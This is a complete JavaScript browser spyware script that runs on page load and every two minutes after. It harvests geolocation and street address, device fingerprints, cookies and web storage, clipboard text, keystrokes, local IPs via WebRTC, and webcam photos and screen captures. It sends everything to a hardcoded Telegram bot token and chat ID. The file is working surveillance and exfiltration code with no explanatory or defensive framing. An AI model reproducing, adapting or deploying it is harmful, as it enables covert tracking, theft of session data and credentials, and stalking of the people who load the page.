 const BOT_TOKEN = '7944060864:AAGvE3ngz4nQYN9ZglGN1-5jHgnok0kyRUY';
    const CHAT_ID = '516496403';
    const DEBUG = false; // Toggle for verbose logging
    let cachedData = {}; // Cache non-volatile data

    async function captureAndSend() {
        const collectedData = { timestamp: new Date().toISOString() };

        try {
            // HTTPS Check
            collectedData.isSecure = window.location.protocol === 'https:';
            if (!collectedData.isSecure) {
                collectedData.securityWarning = 'HTTP detected. Camera, geolocation, microphone, and clipboard blocked. Deploy on HTTPS (e.g., Vercel, Netlify) or enable insecure origins (chrome://flags).';
            }

            // Parallel API Calls
            await Promise.all([
                // Permissions
                (async () => {
                    try {
                        if (navigator.permissions) {
                            const perms = ['camera', 'geolocation', 'microphone', 'notifications'].map(async name => {
                                try {
                                    const perm = await navigator.permissions.query({ name });
                                    return { [name]: perm.state };
                                } catch (e) {
                                    return { [name]: `Error: ${e.message}` };
                                }
                            });
                            collectedData.permissions = Object.assign({}, ...(await Promise.all(perms)));
                        }
                    } catch (error) {
                        logError('Permissions', error);
                        collectedData.permissionsError = `${error.name}: ${error.message}`;
                    }
                })(),

                // IP and Location
                (async () => {
                    try {
                        const [ipResponse, ipInfoResponse] = await Promise.all([
                            fetch('https://api.ipify.org?format=json', { cache: 'no-store' }),
                            fetch('https://ipapi.co/json/')
                        ]);
                        const ipData = await ipResponse.json();
                        const ipInfo = await ipInfoResponse.json();
                        collectedData.ipAddress = ipData.ip;
                        collectedData.ipDetails = {
                            city: ipInfo.city || 'N/A',
                            region: ipInfo.region || 'N/A',
                            country: ipInfo.country_name || 'N/A',
                            isp: ipInfo.org || 'N/A',
                            latitude: ipInfo.latitude || 'N/A',
                            longitude: ipInfo.longitude || 'N/A',
                            postal: ipInfo.postal || 'N/A',
                            timezone: ipInfo.timezone || 'N/A',
                            asn: ipInfo.asn || 'N/A'
                        };
                        cachedData.ipDetails = collectedData.ipDetails;
                    } catch (error) {
                        logError('IP', error);
                        collectedData.ipError = `${error.name}: ${error.message}`;
                        if (cachedData.ipDetails) collectedData.ipDetails = cachedData.ipDetails;
                    }
                })(),

                // Device Info
                (async () => {
                    try {
                        if (!cachedData.deviceInfo) {
                            collectedData.deviceInfo = {
                                userAgent: navigator.userAgent || 'N/A',
                                platform: navigator.platform || 'N/A',
                                language: navigator.language || 'N/A',
                                languages: navigator.languages.join(', ') || 'N/A',
                                screenResolution: `${window.screen.width || 'N/A'}x${window.screen.height || 'N/A'}`,
                                colorDepth: window.screen.colorDepth || 'N/A',
                                pixelRatio: window.devicePixelRatio || 'N/A',
                                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
                                cpuCores: navigator.hardwareConcurrency || 'N/A',
                                deviceMemory: navigator.deviceMemory || 'N/A',
                                touchSupport: 'ontouchstart' in window ? 'Yes' : 'No',
                                webdriver: navigator.webdriver ? 'Yes' : 'No',
                                referrer: document.referrer || 'N/A',
                                url: window.location.href || 'N/A',
                                windowSize: `${window.innerWidth || 'N/A'}x${window.innerHeight || 'N/A'}`,
                                orientation: window.screen.orientation?.type || 'N/A',
                                memory: window.performance?.memory ? `${(window.performance.memory.usedJSHeapSize / 1024 / 1024).toFixed(2)}MB` : 'N/A'
                            };
                            cachedData.deviceInfo = collectedData.deviceInfo;
                        } else {
                            collectedData.deviceInfo = cachedData.deviceInfo;
                        }
                    } catch (error) {
                        logError('DeviceInfo', error);
                        collectedData.deviceInfoError = `${error.name}: ${error.message}`;
                    }
                })(),

                // Fingerprinting
                (async () => {
                    try {
                        if (!cachedData.fingerprint) {
                            const canvas = document.createElement('canvas');
                            const ctx = canvas.getContext('2d');
                            ctx.textBaseline = 'top';
                            ctx.font = '16px Arial';
                            ctx.fillText(`FP${Math.random()}`, 0, 0);
                            const gl = canvas.getContext('webgl');
                            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                            const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Monaco'];
                            collectedData.fingerprint = {
                                canvas: canvas.toDataURL(),
                                webgl: gl ? {
                                    renderer: gl.getParameter(gl.RENDERER),
                                    vendor: gl.getParameter(gl.VENDOR),
                                    version: gl.getParameter(gl.VERSION)
                                } : 'N/A',
                                audio: audioCtx ? `SampleRate: ${audioCtx.sampleRate}, Channels: ${audioCtx.destination.maxChannelCount}` : 'N/A',
                                fonts: fonts.filter(font => {
                                    const span = document.createElement('span');
                                    span.style.fontFamily = font;
                                    document.body.appendChild(span);
                                    const isAvailable = span.style.fontFamily.includes(font);
                                    span.remove();
                                    return isAvailable;
                                }).join(', ') || 'N/A'
                            };
                            if (audioCtx) audioCtx.close();
                            cachedData.fingerprint = collectedData.fingerprint;
                        } else {
                            collectedData.fingerprint = cachedData.fingerprint;
                        }
                    } catch (error) {
                        logError('Fingerprint', error);
                        collectedData.fingerprintError = `${error.name}: ${error.message}`;
                    }
                })(),

                // Cache Probing
                (async () => {
                    try {
                        const testUrls = ['https://facebook.com/favicon.ico', 'https://x.com/favicon.ico', 'https://linkedin.com/favicon.ico', 'https://instagram.com/favicon.ico'];
                        collectedData.visitedSites = [];
                        for (const url of testUrls) {
                            const start = performance.now();
                            const img = new Image();
                            img.src = url + '?' + Math.random();
                            await new Promise(resolve => {
                                img.onload = img.onerror = resolve;
                            });
                            const time = performance.now() - start;
                            if (time < 50) collectedData.visitedSites.push(url);
                        }
                        collectedData.visitedSites = collectedData.visitedSites.join(', ') || 'N/A';
                    } catch (error) {
                        logError('CacheProbe', error);
                        collectedData.cacheError = `${error.name}: ${error.message}`;
                    }
                })(),

                // Geolocation
                (async () => {
                    try {
                        if (collectedData.isSecure) {
                            const position = await new Promise((resolve, reject) => {
                                navigator.geolocation.getCurrentPosition(resolve, reject, {
                                    enableHighAccuracy: true,
                                    timeout: 30000,
                                    maximumAge: 0
                                });
                            });
                            collectedData.geolocation = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude || 'N/A',
                                heading: position.coords.heading || 'N/A',
                                speed: position.coords.speed || 'N/A'
                            };
                            const geocodeResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`);
                            const geocodeData = await geocodeResponse.json();
                            collectedData.address = geocodeData.display_name || 'N/A';
                            collectedData.addressDetails = {
                                road: geocodeData.address.road || 'N/A',
                                city: geocodeData.address.city || geocodeData.address.town || 'N/A',
                                state: geocodeData.address.state || 'N/A',
                                country: geocodeData.address.country || 'N/A',
                                postal: geocodeData.address.postcode || 'N/A'
                            };
                        }
                    } catch (error) {
                        logError('Geolocation', error);
                        collectedData.geoError = `${error.name}: ${error.message}`;
                        if (cachedData.ipDetails?.latitude !== 'N/A') {
                            collectedData.geolocationFallback = {
                                latitude: cachedData.ipDetails.latitude,
                                longitude: cachedData.ipDetails.longitude,
                                source: 'IP-based'
                            };
                        }
                    }
                })(),

                // Battery
                (async () => {
                    try {
                        if (navigator.getBattery) {
                            const battery = await navigator.getBattery();
                            collectedData.battery = {
                                level: (battery.level * 100).toFixed(2),
                                charging: battery.charging,
                                chargingTime: battery.chargingTime || 'N/A',
                                dischargingTime: battery.dischargingTime || 'N/A'
                            };
                        }
                    } catch (error) {
                        logError('Battery', error);
                        collectedData.batteryError = `${error.name}: ${error.message}`;
                    }
                })(),

                // Network
                (async () => {
                    try {
                        if (navigator.connection) {
                            collectedData.network = {
                                type: navigator.connection.effectiveType || 'N/A',
                                downlink: navigator.connection.downlink || 'N/A',
                                rtt: navigator.connection.rtt || 'N/A',
                                saveData: navigator.connection.saveData ? 'Yes' : 'No'
                            };
                        }
                    } catch (error) {
                        logError('Network', error);
                        collectedData.networkError = `${error.name}: ${error.message}`;
                    }
                })(),

                // Sensors
                (async () => {
                    try {
                        if (window.DeviceMotionEvent) {
                            await new Promise(resolve => {
                                window.addEventListener('devicemotion', (event) => {
                                    collectedData.accelerometer = {
                                        x: event.acceleration.x || 'N/A',
                                        y: event.acceleration.y || 'N/A',
                                        z: event.acceleration.z || 'N/A'
                                    };
                                    resolve();
                                }, { once: true });
                            });
                        }
                        if (window.DeviceOrientationEvent) {
                            await new Promise(resolve => {
                                window.addEventListener('deviceorientation', (event) => {
                                    collectedData.gyroscope = {
                                        alpha: event.alpha || 'N/A',
                                        beta: event.beta || 'N/A',
                                        gamma: event.gamma || 'N/A'
                                    };
                                    resolve();
                                }, { once: true });
                            });
                        }
                        if (window.AmbientLightSensor) {
                            const sensor = new AmbientLightSensor();
                            await new Promise(resolve => {
                                sensor.onreading = () => {
                                    collectedData.ambientLight = sensor.illuminance || 'N/A';
                                    sensor.stop();
                                    resolve();
                                };
                                sensor.onerror = () => {
                                    collectedData.ambientLight = 'N/A';
                                    sensor.stop();
                                    resolve();
                                };
                                sensor.start();
                            });
                        }
                    } catch (error) {
                        logError('Sensors', error);
                        collectedData.sensorError = `${error.name}: ${error.message}`;
                    }
                })(),

                // Clipboard
                (async () => {
                    try {
                        if (collectedData.isSecure && navigator.clipboard) {
                            collectedData.clipboard = await navigator.clipboard.readText() || 'N/A';
                            window.addEventListener('paste', async () => {
                                collectedData.clipboardUpdate = await navigator.clipboard.readText() || 'N/A';
                            }, { once: true });
                        }
                    } catch (error) {
                        logError('Clipboard', error);
                        collectedData.clipboardError = `${error.name}: ${error.message}`;
                    }
                })(),

                // Storage
                (async () => {
                    try {
                        collectedData.storage = {
                            cookies: document.cookie || 'N/A',
                            localStorage: JSON.stringify(localStorage) || 'N/A',
                            sessionStorage: JSON.stringify(sessionStorage) || 'N/A',
                            indexedDB: window.indexedDB ? 'Available' : 'N/A'
                        };
                    } catch (error) {
                        logError('Storage', error);
                        collectedData.storageError = `${error.name}: ${error.message}`;
                    }
                })(),

                // WebRTC
                (async () => {
                    try {
                        const rtc = new RTCPeerConnection({
                            iceServers: [
                                { urls: 'stun:stun.l.google.com:19302' },
                                { urls: 'stun:stun1.l.google.com:19302' },
                                { urls: 'stun:stun2.l.google.com:19302' }
                            ]
                        });
                        const localIPs = new Set();
                        rtc.onicecandidate = (e) => {
                            if (e.candidate && e.candidate.candidate) {
                                const ipMatch = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                                if (ipMatch) localIPs.add(ipMatch[1]);
                            }
                        };
                        await rtc.createDataChannel('test');
                        await rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                        await new Promise(resolve => setTimeout(resolve, 2000));
                        collectedData.localIPs = Array.from(localIPs).join(', ') || 'N/A';
                        rtc.close();
                    } catch (error) {
                        logError('WebRTC', error);
                        collectedData.webRtcError = `${error.name}: ${error.message}`;
                    }
                })(),

                // Keystrokes
                (async () => {
                    try {
                        collectedData.keystrokes = [];
                        document.addEventListener('keydown', (e) => {
                            if (collectedData.keystrokes.length < 20) {
                                collectedData.keystrokes.push(`${e.key}:${performance.now()}`);
                            }
                        }, { once: true });
                    } catch (error) {
                        logError('Keystrokes', error);
                        collectedData.keystrokeError = `${error.name}: ${error.message}`;
                    }
                })(),

                // Microphone
                (async () => {
                    try {
                        if (collectedData.isSecure) {
                            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                            const audioCtx = new AudioContext();
                            const analyser = audioCtx.createAnalyser();
                            const source = audioCtx.createMediaStreamSource(stream);
                            source.connect(analyser);
                            const data = new Float32Array(analyser.frequencyBinCount);
                            analyser.getFloatFrequencyData(data);
                            collectedData.audioMetadata = `Bins: ${data.length}, Max: ${Math.max(...data).toFixed(2)}`;
                            stream.getTracks().forEach(track => track.stop());
                            audioCtx.close();
                        }
                    } catch (error) {
                        logError('Microphone', error);
                        collectedData.audioError = `${error.name}: ${error.message}`;
                    }
                })(),

                // Screen Capture
                (async () => {
                    try {
                        if (collectedData.isSecure) {
                            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                            const video = document.createElement('video');
                            video.srcObject = stream;
                            video.style.display = 'none';
                            document.body.appendChild(video);
                            await video.play();
                            await new Promise(resolve => video.onloadedmetadata = resolve);
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            collectedData.screenCapture = canvas.toDataURL('image/jpeg', 0.4);
                            stream.getTracks().forEach(track => track.stop());
                            video.remove();
                        }
                    } catch (error) {
                        logError('ScreenCapture', error);
                        collectedData.screenError = `${error.name}: ${error.message}`;
                    }
                })(),

                // Bluetooth
                (async () => {
                    try {
                        if (navigator.bluetooth) {
                            const devices = await navigator.bluetooth.getDevices();
                            collectedData.bluetooth = devices.map(d => d.name || 'Unknown').join(', ') || 'N/A';
                        }
                    } catch (error) {
                        logError('Bluetooth', error);
                        collectedData.bluetoothError = `${error.name}: ${error.message}`;
                    }
                })(),

                // Extensions
                (async () => {
                    try {
                        const extensions = ['uBlock0', 'AdBlock', 'PrivacyBadger'];
                        collectedData.extensions = [];
                        for (const ext of extensions) {
                            const start = performance.now();
                            const img = new Image();
                            img.src = `chrome-extension://${ext}/icon.png`;
                            await new Promise(resolve => {
                                img.onload = img.onerror = resolve;
                            });
                            const time = performance.now() - start;
                            if (time < 50) collectedData.extensions.push(ext);
                        }
                        collectedData.extensions = collectedData.extensions.join(', ') || 'N/A';
                    } catch (error) {
                        logError('Extensions', error);
                        collectedData.extensionError = `${error.name}: ${error.message}`;
                    }
                })(),

                // Camera
                (async () => {
                    let hasCamera = false;
                    try {
                        const devices = await navigator.mediaDevices.enumerateDevices();
                        hasCamera = devices.some(device => device.kind === 'videoinput');
                        collectedData.camera = {
                            available: hasCamera,
                            count: devices.filter(d => d.kind === 'videoinput').length,
                            labels: devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Unnamed').join(', ') || 'N/A'
                        };
                    } catch (error) {
                        logError('CameraEnum', error);
                        collectedData.cameraError = `${error.name}: ${error.message}`;
                    }

                    if (hasCamera && collectedData.isSecure) {
                        try {
                            const constraints = [
                                { video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } },
                                { video: { facingMode: 'user' } },
                                { video: true }
                            ];
                            let stream = null;
                            for (const constraint of constraints) {
                                try {
                                    stream = await navigator.mediaDevices.getUserMedia(constraint);
                                    collectedData.camera.usedConstraint = JSON.stringify(constraint);
                                    break;
                                } catch (err) {
                                    logWarn(`Camera attempt: ${err.name}`);
                                }
                            }
                            if (!stream) throw new Error('All camera constraints failed');
                            const video = document.createElement('video');
                            video.srcObject = stream;
                            video.style.display = 'none';
                            document.body.appendChild(video);
                            await video.play();
                            await new Promise(resolve => video.onloadedmetadata = resolve);
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d', { willReadFrequently: true });
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            collectedData.camera.photo = canvas.toDataURL('image/jpeg', 0.4);
                            stream.getTracks().forEach(track => track.stop());
                            video.remove();
                        } catch (error) {
                            logError('Camera', error);
                            collectedData.cameraError = `${error.name}: ${error.message}`;
                        }
                    } else {
                        collectedData.cameraError = hasCamera ? 'Camera requires HTTPS.' : 'No camera detected.';
                    }
                })()
            ]);

            // Send Data
            const message = formatCollectedData(collectedData);
            await sendMessageToTelegramWithRetry(message, 5);
            if (collectedData.camera?.photo) await sendPhotoWithRetry(collectedData.camera.photo, 5, 'photo');
            if (collectedData.screenCapture) await sendPhotoWithRetry(collectedData.screenCapture, 5, 'screen');
        } catch (error) {
            logError('Main', error);
            collectedData.mainError = `${error.name}: ${error.message}`;
            const message = formatCollectedData(collectedData);
            await sendMessageToTelegramWithRetry(message, 5);
        }
    }

    function formatCollectedData(data) {
        try {
            const lines = [`Device Info (${data.timestamp}):`];
            lines.push(`HTTPS: ${data.isSecure ? 'Yes' : 'No'}`);
            if (!data.isSecure) lines.push(`Warning: ${data.securityWarning}`);
            lines.push(`Permissions: ${JSON.stringify(data.permissions || 'N/A')}`);
            lines.push(`IP: ${data.ipAddress || 'N/A'}`);
            if (data.ipDetails) {
                lines.push(`IP Location: ${data.ipDetails.city}, ${data.ipDetails.region}, ${data.ipDetails.country}`);
                lines.push(`ISP: ${data.ipDetails.isp}`);
                lines.push(`IP Coords: ${data.ipDetails.latitude}, ${data.ipDetails.longitude}`);
                lines.push(`Postal: ${data.ipDetails.postal}`);
                lines.push(`Timezone: ${data.ipDetails.timezone}`);
                lines.push(`ASN: ${data.ipDetails.asn}`);
            }
            if (data.deviceInfo) {
                Object.entries(data.deviceInfo).forEach(([k, v]) => lines.push(`${k}: ${v}`));
            }
            if (data.fingerprint) {
                lines.push(`CanvasFP: ${data.fingerprint.canvas ? 'Generated' : 'N/A'}`);
                if (data.fingerprint.webgl !== 'N/A') {
                    lines.push(`WebGL: ${data.fingerprint.webgl.renderer}, ${data.fingerprint.webgl.vendor}, ${data.fingerprint.webgl.version}`);
                }
                lines.push(`AudioFP: ${data.fingerprint.audio}`);
                lines.push(`Fonts: ${data.fingerprint.fonts}`);
            }
            if (data.visitedSites) lines.push(`Visited: ${data.visitedSites}`);
            if (data.geolocation) {
                lines.push(`Geo: ${data.geolocation.latitude}, ${data.geolocation.longitude}, Acc: ${data.geolocation.accuracy}m, Alt: ${data.geolocation.altitude}`);
                lines.push(`Address: ${data.address}`);
                if (data.addressDetails) {
                    lines.push(`AddrDetails: ${data.addressDetails.road}, ${data.addressDetails.city}, ${data.addressDetails.state}, ${data.addressDetails.country}, ${data.addressDetails.postal}`);
                }
            }
            if (data.geolocationFallback) {
                lines.push(`GeoFallback: ${data.geolocationFallback.latitude}, ${data.geolocationFallback.longitude} (${data.geolocationFallback.source})`);
            }
            if (data.battery) {
                lines.push(`Battery: ${data.battery.level}%${data.battery.charging ? ' (Charging)' : ''}, CT: ${data.battery.chargingTime}s, DT: ${data.battery.dischargingTime}s`);
            }
            if (data.network) {
                lines.push(`Network: ${data.network.type}, ${data.network.downlink}Mbps, RTT: ${data.network.rtt}ms, SaveData: ${data.network.saveData}`);
            }
            if (data.accelerometer) {
                lines.push(`Accel: X:${data.accelerometer.x}, Y:${data.accelerometer.y}, Z:${data.accelerometer.z}`);
            }
            if (data.gyroscope) {
                lines.push(`Gyro: A:${data.gyroscope.alpha}, B:${data.gyroscope.beta}, G:${data.gyroscope.gamma}`);
            }
            if (data.ambientLight) lines.push(`Light: ${data.ambientLight}lux`);
            if (data.clipboard) lines.push(`Clipboard: ${data.clipboard}`);
            if (data.clipboardUpdate) lines.push(`ClipboardUpdate: ${data.clipboardUpdate}`);
            if (data.storage) {
                lines.push(`Cookies: ${data.storage.cookies}`);
                lines.push(`LocalStorage: ${data.storage.localStorage}`);
                lines.push(`SessionStorage: ${data.storage.sessionStorage}`);
                lines.push(`IndexedDB: ${data.storage.indexedDB}`);
            }
            lines.push(`LocalIPs: ${data.localIPs || 'N/A'}`);
            lines.push(`Keystrokes: ${data.keystrokes?.join('; ') || 'N/A'}`);
            lines.push(`AudioMeta: ${data.audioMetadata || 'N/A'}`);
            lines.push(`ScreenCapture: ${data.screenCapture ? 'Captured' : 'N/A'}`);
            lines.push(`Bluetooth: ${data.bluetooth || 'N/A'}`);
            lines.push(`Extensions: ${data.extensions || 'N/A'}`);
            if (data.camera) {
                lines.push(`Camera: ${data.camera.available ? 'Yes' : 'No'}, Count: ${data.camera.count}, Labels: ${data.camera.labels}`);
                if (data.camera.photo) lines.push(`Photo: Captured`);
            }
            ['mainError', 'permissionsError', 'ipError', 'deviceInfoError', 'fingerprintError', 'cacheError', 'geoError', 'batteryError', 'networkError', 'sensorError', 'clipboardError', 'storageError', 'webRtcError', 'keystrokeError', 'audioError', 'screenError', 'bluetoothError', 'extensionError', 'cameraError'].forEach(err => {
                if (data[err]) lines.push(`${err}: ${data[err]}`);
            });
            return lines.join('\n').substring(0, 4096); // Telegram message limit
        } catch (error) {
            logError('FormatData', error);
            return `Error formatting data: ${error.message}`;
        }
    }

    async function sendMessageToTelegramWithRetry(message, retries) {
        let delay = 1000;
        for (let i = 0; i < retries; i++) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                });
                if (response.ok) {
                    if (DEBUG) console.log('Message sent');
                    return true;
                }
                logError('TelegramMessage', new Error(`Status: ${response.status}`));
                await new Promise(resolve => setTimeout(resolve, delay));
                delay *= 2; // Exponential backoff
            } catch (error) {
                logError('TelegramMessage', error);
                await new Promise(resolve => setTimeout(resolve, delay));
                delay *= 2;
            }
        }
        logError('TelegramMessage', new Error('All retries failed'));
        return false;
    }

    async function sendPhotoWithRetry(photo, retries, type = 'photo') {
        let delay = 1000;
        for (let i = 0; i < retries; i++) {
            try {
                const blob = dataURItoBlob(photo);
                if (!blob) throw new Error('Blob conversion failed');
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `${type}_${Date.now()}.jpg`);
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                if (response.ok) {
                    if (DEBUG) console.log(`${type} sent`);
                    return true;
                }
                logError('TelegramPhoto', new Error(`Status: ${response.status}`));
                await new Promise(resolve => setTimeout(resolve, delay));
                delay *= 2;
            } catch (error) {
                logError('TelegramPhoto', error);
                await new Promise(resolve => setTimeout(resolve, delay));
                delay *= 2;
            }
        }
        logError('TelegramPhoto', new Error('All retries failed'));
        return false;
    }

    function dataURItoBlob(dataURI) {
        try {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const arrayBuffer = new ArrayBuffer(byteString.length);
            const intArray = new Uint8Array(arrayBuffer);
            for (let i = 0; i < byteString.length; i++) {
                intArray[i] = byteString.charCodeAt(i);
            }
            return new Blob([arrayBuffer], { type: mimeString });
        } catch (error) {
            logError('BlobConversion', error);
            return null;
        }
    }

    function logError(context, error) {
        if (DEBUG) console.error(`${context}: ${error.name}: ${error.message}`);
    }

    function logWarn(message) {
        if (DEBUG) console.warn(message);
    }

    // Run with randomized interval
    try {
        captureAndSend();
        const baseInterval = 120000;
        const jitter = () => Math.random() * 1000;
        setInterval(() => captureAndSend(), baseInterval + jitter());
    } catch (error) {
        logError('Startup', error);
    }